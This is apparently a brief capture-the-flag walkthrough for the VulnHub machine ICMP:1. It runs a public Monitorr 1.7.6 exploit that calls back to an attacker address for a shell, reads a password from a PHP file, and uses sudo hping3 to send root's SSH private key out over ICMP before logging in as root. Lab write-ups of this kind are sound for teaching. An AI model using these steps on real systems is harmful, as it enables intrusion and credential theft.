

# ICMP:1 Walkthrough

**VulnHub Link:** [ICMP:1](https://www.vulnhub.com/entry/icmp-1,633/)
**Difficulty:** Easy  
**Release Date:** 16 Dec 2020

---

## 1. Reconnaissance

### Nmap Scan

nmap -A -O -T4 -P -sV 192.168.100.130


## 2. Web Enumeration

dirb http://192.168.100.100

monitor 1.7.6 exploit found

python 48980.py http://192.168.100.100/mon 192.168.100.14 5555

shell opened and --> cat reminder

user flag captured

cat /devel/crypt.php --> fox password found

## 3. Privilege Escalation

in one terminal session --> sudo hping3 --icmp 127.0.0.1 --sign signature --safe

in another --> sudo hping3 --icmp 127.0.0.1 -d 100 --sign signature --file "/root/.ssh/id_rsa"

and id_rsa copied then get root shell with ssh ---> ssh rot@192.168.100.100 -i id_rsa

root flag captured
